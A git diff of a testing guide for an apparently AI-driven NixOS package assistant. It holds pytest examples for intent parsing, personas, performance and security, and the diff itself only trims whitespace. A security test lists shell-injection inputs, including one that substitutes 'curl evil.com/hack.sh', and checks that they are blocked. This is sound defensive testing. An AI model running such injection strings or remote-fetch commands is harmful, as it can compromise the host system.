@@ -4,15 +4,15 @@
 
 ---
 
-💡 **Quick Context**: Complete testing strategy for reliable, accessible, and trustworthy symbiotic AI  
-📍 **You are here**: Development → Testing Guide (Quality Assurance Framework)  
-🔗 **Related**: [Code Standards](./04-CODE-STANDARDS.md) | [Quick Start](./03-QUICK-START.md) | [Master Documentation Map](../MASTER_DOCUMENTATION_MAP.md)  
-⏱️ **Read time**: 12 minutes  
+💡 **Quick Context**: Complete testing strategy for reliable, accessible, and trustworthy symbiotic AI
+📍 **You are here**: Development → Testing Guide (Quality Assurance Framework)
+🔗 **Related**: [Code Standards](./04-CODE-STANDARDS.md) | [Quick Start](./03-QUICK-START.md) | [Master Documentation Map](../MASTER_DOCUMENTATION_MAP.md)
+⏱️ **Read time**: 12 minutes
 📊 **Mastery Level**: 🌿 Intermediate - requires testing experience and understanding of AI systems
 
 🌊 **Natural Next Steps**:
 - **For new developers**: Start with [Quick Start Guide](./03-QUICK-START.md) to setup your environment first
-- **For implementers**: Review [Code Standards](./04-CODE-STANDARDS.md) for testing patterns and requirements  
+- **For implementers**: Review [Code Standards](./04-CODE-STANDARDS.md) for testing patterns and requirements
 - **For QA engineers**: Continue to [System Architecture](../02-ARCHITECTURE/01-SYSTEM-ARCHITECTURE.md) to understand what you're testing
 - **For contributors**: Check [Sacred Trinity Workflow](./02-SACRED-TRINITY-WORKFLOW.md) for development process integration
 
@@ -101,27 +101,27 @@ from nix_humanity.nlp import NLPEngine
 
 class TestNLPEngine:
     """Test natural language understanding components."""
-    
+
     def test_intent_recognition_install(self):
         """Test recognizing install intent from various phrases."""
         nlp = NLPEngine()
-        
+
         test_phrases = [
             "install firefox",
             "I need firefox",
             "get me that firefox thing",
             "can you install firefox for me?"
         ]
-        
+
         for phrase in test_phrases:
             result = nlp.parse(phrase)
             assert result.intent == "install"
             assert result.package == "firefox"
-    
+
     def test_typo_correction(self):
         """Test automatic typo correction."""
         nlp = NLPEngine()
-        
+
         result = nlp.parse("instal fierfix")
         assert result.intent == "install"
         assert result.package == "firefox"
@@ -137,24 +137,24 @@ from nix_humanity.backend import Backend
 
 class TestCLIIntegration:
     """Test CLI interaction with backend services."""
-    
+
     @pytest.fixture
     def cli_with_backend(self):
         """Create CLI connected to test backend."""
         backend = Backend(test_mode=True)
         cli = CLI(backend=backend)
         return cli
-    
+
     def test_install_flow(self, cli_with_backend):
         """Test complete installation flow."""
         # User input
         response = cli_with_backend.process("install firefox")
-        
+
         # Check response
         assert response.success
         assert "firefox" in response.message
         assert response.command == "nix-env -iA nixos.firefox"
-        
+
         # Verify backend state
         assert cli_with_backend.backend.last_intent == "install"
 ```
@@ -167,7 +167,7 @@ from nix_humanity.test_utils import PersonaSimulator
 
 class TestPersonaJourneys:
     """Test complete user journeys for each persona."""
-    
+
     @pytest.mark.parametrize("persona", [
         "grandma_rose",
         "maya_adhd",
@@ -177,10 +177,10 @@ class TestPersonaJourneys:
     def test_first_time_install(self, persona):
         """Test first software installation for each persona."""
         simulator = PersonaSimulator(persona)
-        
+
         # Simulate natural interaction
         session = simulator.start_session()
-        
+
         # Persona-specific input
         if persona == "grandma_rose":
             response = session.speak("I need that Firefox thing my grandson mentioned")
@@ -190,7 +190,7 @@ class TestPersonaJourneys:
             response = session.type("install firefox-esr for research")
         elif persona == "alex_blind":
             response = session.screen_reader_input("install firefox")
-        
+
         # Verify success for persona
         assert response.accessible
         assert response.time_ms < simulator.persona.max_response_time
@@ -205,12 +205,12 @@ class TestPersonaJourneys:
   - Command execution
   - Safety validation
   - Error handling
-  
+
 - **Core Features**: 90%
   - Learning system
   - Context management
   - Personality adaptation
-  
+
 - **UI/UX**: 80%
   - CLI interactions
   - TUI components
@@ -260,7 +260,7 @@ PERSONAS = {
 # tests/fixtures/mock_nixos.py
 class MockNixOS:
     """Mock NixOS system for testing."""
-    
+
     def __init__(self):
         self.installed_packages = set()
         self.available_packages = {
@@ -268,7 +268,7 @@ class MockNixOS:
             "chromium": {"version": "119.0", "size": "85MB"},
             # ... more packages
         }
-    
+
     def install(self, package):
         """Simulate package installation."""
         if package in self.available_packages:
@@ -329,24 +329,24 @@ import pytest
 
 class TestPerformance:
     """Ensure performance budgets are met."""
-    
+
     @pytest.mark.performance
     def test_simple_command_speed(self, nlp_engine):
         """Simple commands must respond in <2 seconds."""
         start = time.time()
-        
+
         result = nlp_engine.process("install firefox")
-        
+
         duration = time.time() - start
         assert duration < 2.0, f"Took {duration}s, max allowed is 2s"
-    
+
     @pytest.mark.performance
     def test_maya_speed_requirement(self, nlp_engine):
         """Maya (ADHD) requires <1 second responses."""
         start = time.time()
-        
+
         result = nlp_engine.process("firefox", persona="maya")
-        
+
         duration = time.time() - start
         assert duration < 1.0, f"Maya needs <1s, took {duration}s"
 ```
@@ -358,7 +358,7 @@ class TestPerformance:
 # tests/security/test_boundaries.py
 class TestSecurityBoundaries:
     """Test security boundaries are maintained."""
-    
+
     def test_no_shell_injection(self, command_executor):
         """Prevent shell injection attacks."""
         malicious_inputs = [
@@ -366,20 +366,20 @@ class TestSecurityBoundaries:
             "install `echo pwned`",
             "install $(curl evil.com/hack.sh)"
         ]
-        
+
         for evil_input in malicious_inputs:
             result = command_executor.process(evil_input)
             assert result.blocked
             assert "security" in result.reason.lower()
-    
+
     def test_privacy_preserved(self, learning_system):
         """Ensure no private data is leaked."""
         # Add private data
         learning_system.learn("install firefox", "/home/user/secret.txt")
-        
+
         # Export learned data
         exported = learning_system.export()
-        
+
         # Verify sanitization
         assert "/home/user" not in str(exported)
         assert "secret.txt" not in str(exported)
